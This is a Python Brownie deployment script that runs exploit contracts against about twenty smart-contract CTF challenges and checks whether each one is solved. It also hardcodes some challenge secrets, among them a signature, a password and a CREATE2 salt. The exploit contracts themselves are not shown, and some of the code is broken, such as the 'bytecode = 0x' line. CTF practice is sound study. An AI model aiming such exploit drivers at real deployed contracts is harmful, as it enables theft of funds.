from brownie import (
    network,
    Contract,
    accounts,
    # ExploitBecomeMaster,
    # ExploitQuiz,
    # ExploitPadlock,
    # QuizExploit,
    # ChallengeExploit,
    # CampaignExploit,
    # ExploitCollectReward,
    # ExploitIflp,
    # ExploitCollision,
    # ExploitFundraising,
    # QuizExploitSetup,
    # ExploitDead,
    # PadlockSetup,
    # ExploitInflation,
    # ExploitNoob,
    # ExploitFunny,
    # Factory,
    # ExploitCreate2,
    # SloganP,
    # ChallengeP,
    # Temp,
    # ExploitP,
    # ExploitSheer,
    # ExploitPixel,
    # ExploitCombination,
    # ExploitBitMania,
    # ExploitDungeon,
    # ChallengeL,
    # ExploitChallenge,
    GLDToken,
    Setup,
    interface,
    ExploitChallenge,
)
from brownie.network.gas.strategies import GasNowStrategy
from dotenv import dotenv_values
from web3 import Web3
from scripts.helpful_scripts import get_account

AMOUNT = AMOUNT = Web3.toWei(1, "ether")
GAS_LIMIT = 30000000
gas_strategy = GasNowStrategy("fast")


# BecomeMaster
def band0x():
    account = accounts.add(dotenv_values(".env")["private1"])
    setup_address = "0x46C9489797C5647F850DD3A5BCB13C240BCD383A"
    exploitable_address = "0xD2034A50C5ADC8A190D4F8C8EE18643AB8A0FF05"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitBecomeMaster.deploy(
        exploitable_address, {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT}
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


# ExampleQuizExploit
def sidduHERE():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x76BB80b4F1bA62eD2665f537f605C3593daCc458"
    exploitable_address = "0x43c3E684cfCD27083f7156E7d883FC7e449e1c59"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitQuiz.deploy(
        exploitable_address, {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT}
    )
    tx_exploit = exploiter.finalize({"from": account, "gas_limit": GAS_LIMIT})
    tx_exploit.wait(1)
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


# Padlock
def bowtiedpickle():
    account = accounts.add(dotenv_values(".env")["private1"])
    setup_address = "0xfF2c41d306098Ce69316C781137EaF05FABDFF6b"
    exploitable_address = "0xF8e8370A8d0a840DB47B2d52BEe5C549aD04809a"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitPadlock.deploy(
        exploitable_address, {"from": account, "value": 33, "gas_limit": GAS_LIMIT}
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def iflp():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x38B500E61267Ee672c823bE3a8fA559236Bd1FD3"
    exploitable_address = "0x070cd04e0ab2bf1e10411f7ab1b0972164f72879"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitIflp.deploy(
        exploitable_address, {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT}
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def smbsp():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x838Ed804d95044516C16473C91388AE195da0B76"
    exploitable_address = "0xf8cd9B34e1B526Fef4D0eb2cA595D3D349F2301a"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitCollectReward.deploy(
        exploitable_address, {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT}
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


# Challenge
def johngish():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x427255B0e21A7f0D809c7cE854569A10df44378d"
    exploitable_address = "0x2Dec5971b627485A50af67a921C6ADB6CC3ffCe4"
    setup = interface.ISetup(setup_address)
    exploiter = ChallengeExploit.deploy(
        exploitable_address, {"from": account, "value": 100, "gas_limit": GAS_LIMIT}
    )
    tx = exploiter.finalize({"from": account, "gas_limit": GAS_LIMIT})
    tx.wait(1)
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


# Crowdfunding
def mhchia():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x6c06959586640De3BcdE69BDcEbF2efDa5d3983B"
    exploitable_address = "0xC2c83168E3bf85A5DEabF25f9f9873085C201C79"
    setup = interface.ISetup(setup_address)
    exploiter = CampaignExploit.deploy(
        exploitable_address, {"from": account, "value": 5, "gas_limit": GAS_LIMIT}
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def kankan0():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x9e6C0511d07695420A0B57003d6e8c133Cd0185d"
    exploitable_address = "0x7e18A61fd65F5E5Cf693257235a0A1F360aBE7d8"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitDead.deploy(
        exploitable_address,
        {"from": account, "value": 15 * AMOUNT, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def moostorm():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x5e40D0d98126323b81246008d386a93BA091704f"
    exploitable_address = "0xE442a00a4587677c945598e19DF41822e851c1DE"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitCollision.deploy(
        exploitable_address,
        {"from": account, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def tqtsar():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x0dCb022a9927613f1B4B23F4F893515BA196c5c5"
    exploitable_address = "0x44898e95E81600e7aD0a85F7e1A5daA987BC1365"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitFundraising.deploy(
        exploitable_address,
        {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def lucyoa():
    account = get_account()
    challenge = ChallengeL.deploy({"from": account, "gas_limit": GAS_LIMIT})
    print(challenge)


def saianmk():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0xbFB2C43021629C87b83C97F1FAC8D5f6b1078593"
    exploitable_address = "0xB5193e99607e7e63B49ACC48fCe0AC7A3676e4F6"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitCombination.deploy(
        exploitable_address,
        {"from": account, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def luksgrin():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x9BDCf71048DFd8ef1C03a7ae3EDe79F04A096B7F"
    exploitable_address = "0x137A5B4bB53A62BD1Db46e563b89D1884afaC0Ac"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitDungeon.deploy(
        exploitable_address,
        {"from": account, "value": 3 * AMOUNT, "gas_limit": GAS_LIMIT},
    )
    tx = exploiter.finalize({"from": account, "gas_limit": GAS_LIMIT})
    tx.wait(1)
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def hack3r():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0xA083913ed673b23dC5FB921b3909021CacFD794C"
    exploitable_address = "0x16051547CbaD42bBec882A7E9e6091796d0D1f50"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitBitMania.deploy(
        exploitable_address,
        {"from": account, "gas_limit": GAS_LIMIT},
    )

    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def drave():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x1f5c09a7d6a9B30b43DDDAABD384425DEe0ADe91"
    exploitable_address = "0xc7e13b9c94Eb3902Fa272E83Bb4D19392d09eF4d"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitSheer.deploy(
        exploitable_address,
        {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT},
    )

    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def ebaizel():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x5364B5A9e489b495CaAE4722e9706C817Cf54433"
    exploitable_address = "0x784B7A7A25ED38EF830AEFe7985c64f3AdF08346"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitPixel.deploy(
        exploitable_address,
        {"from": account, "gas_limit": GAS_LIMIT},
    )

    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def bahurum():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0xABF1f66a9fb48F3f5b75C8A83FB5854A9d906343"
    exploitable_address = "0x68C3CA33c766cd60E4Af98D697EBd541B4DA7968"
    token_address = "0x58f8823e20ffc6f2419a7d2b24604415eadc8877"
    setup = interface.ISetup(setup_address)
    exploiter = ExploitNoob.deploy(
        exploitable_address,
        token_address,
        {"from": account, "gas_limit": GAS_LIMIT},
    )

    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def naps62():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x4742FD1862E94dc74AeD62A96B6374E68e658f80"
    exploitable_address = "0xA1BCb047E9dc4aCcB36c14288239f9283DF3E68e"
    setup = interface.ISetup(setup_address)
    sig = 0xBEA09ECAD9C418F7C59D10BBE4C4764E33785050948268D2FCC1D82EEFF8F5B54A4555024C2AAC545C3F17EA3D49AB66312EBCD50C30ED64645E664F56AB3ACA10
    password = 0xD1E8AEB79500496EF3DC2E57BA746A8315D048B7A664A2BF948DB4FA91960483
    exploiter = ExploitNoob.deploy(
        exploitable_address,
        sig,
        password,
        0x10,
        {"from": account, "gas_limit": GAS_LIMIT},
    )

    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def ych18():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0x40D1e6Fa69957f4c66461b8c8AB60108265F52b2"
    exploitable_address = "0x482b62c99e9ee97126b8a56828f105e07904fd03"
    setup = interface.ISetup(setup_address)
    ch1 = "SherlockCTF"
    ch2 = " "

    exploit = ExploitFunny.deploy(
        exploitable_address,
        ch1,
        ch2,
        0xA9059CBB,
        {"from": account, "value": 2 * AMOUNT, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def thro77le():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0xBF3e5530aB7Dcba712E3A7fA99463d46eb6a0c8e"
    exploitable_address = "0xd9C72eD9DdeF04D0Ab88aE2403C383Ffbd11a71c"
    factory = "0xfd4f30c20da65a37fd74d55b257442a08469e6a6"
    setup = interface.ISetup(setup_address)
    bytecode = 0x
    salt = 45231
    contract_address = "0xD5c62C0B88F0B1dB07ea854D9540611A662488EE"
    exploit = ExploitCreate2.deploy(
        bytecode,
        exploitable_address,
        contract_address,
        salt,
        {"from": account, "value": 2 * AMOUNT, "gas_limit": GAS_LIMIT},
    )
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def teryanarmen():
    account = accounts.add(dotenv_values(".env")["private0"])
    setup_address = "0xAD392F2a981bDE60B43eC988a30ce2aE2d755eD2"
    exploitable_address = "0x8720D38BbC9212B8fD202BCcda07cff32b6F7920"
    factory = Factory.deploy(
        exploitable_address, {"from": account, "gas_limit": GAS_LIMIT}
    )
    setup = interface.ISetup(setup_address)
    # factory = Factory[-1]
    tx = factory.finalize({"from": account, "gas_limit": GAS_LIMIT})
    tx.wait(1)
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


def main():
    # lucyoa()
    # band0x() Done
    # sidduHERE()
    # bowtiedpickle()
    # iflp()
    # smbsp()
    # johngish()
    # mhchia()
    # kankan0()
    # moostorm()
    # tqtsar()
    # saianmk()
    # luksgrin()
    # hack3r()
    # drave()
    # ebaizel()
    # bahurum()
    # naps62()
    # ych18()
    # teryanarmen()
    # thro77le()
    # account = accounts.add(dotenv_values(".env")["private0"])
    # sample = QuizExploitSetup[-1]
    # exploitable = interface.IGuess(sample.instance())
    # setup_address = "0xb2961fd4214D19af644a7d80e02488e579444a6E"
    # setup = interface.ISetup(setup_address)
    # exploiter = ExploitIflp.deploy(
    #     sample.instance(), {"from": account, "value": AMOUNT, "gas_limit": GAS_LIMIT}
    # )
    # is_solved = setup.isSolved()
    # print(f"CTF is solved : {is_solved}")
    # account = accounts.add(dotenv_values(".env")["private0"])
    # setup_address = "0xBF3e5530aB7Dcba712E3A7fA99463d46eb6a0c8e"
    # exploitable_address = "0xd9C72eD9DdeF04D0Ab88aE2403C383Ffbd11a71c"
    # setup = interface.ISetup(setup_address)
    # is_solved = setup.isSolved()
    # print(f"CTF is solved : {is_solved}")
    account = accounts.add(dotenv_values(".env")["private0"])
    # slogan = SloganP.deploy({"from": account, "gas_limit": GAS_LIMIT})
    # challenge = ChallengeP.deploy(slogan, {"from": account, "gas_limit": GAS_LIMIT})
    # exploit = ExploitChallenge.deploy(
    #     {"from": account, "gas_limit": GAS_LIMIT, "value": AMOUNT}
    # )
    # exploit = ExploitChallenge[-1]
    # #setup = Setup.deploy({"from": account, "gas_limit": GAS_LIMIT, "value": AMOUNT})
    # setup = Setup[-1]
    # challenge = setup.instance()
    # print("challenge :", challenge)
    # # tmp = Temp.deploy(account, {"from": account})
    # print(exploit)
    # x = 5806469386143411415145781154245422091809056237
    # mystring = "0"
    # for i in range(x):
    #     mystring += "0"

    # print(len(mystring))

    # setup = Setup.deploy({"from": account, "gas_limit": GAS_LIMIT})
    # instance = setup.instance()
    # challenge = interface.IChallenge(instance)
    # gov_token_address = challenge.govTokens(0)
    # gov_token = interface.IERC777(gov_token_address)
    # print(gov_token.balanceOf(instance) / 10 ** 18)
    # exploit = ExploitChallenge.deploy(
    #     instance, {"from": account, "gas_limit": GAS_LIMIT}
    # )
    # tx = exploit.finalize({"from": account, "gas_limit": GAS_LIMIT})
    # tx.wait(1)
    # print(gov_token.balanceOf(exploit) / 10 ** 18)
    # print(gov_token.balanceOf(instance) / 10 ** 18)
    # print(exploit.faucetUsed())
    setup_address = "0x0a73CA730FaF56126487196a4B7E10B2A9B3df67"
    setup = interface.ISetup(setup_address)
    is_solved = setup.isSolved()
    print(f"CTF is solved : {is_solved}")


# if __name__ == "__main__":
#     main()
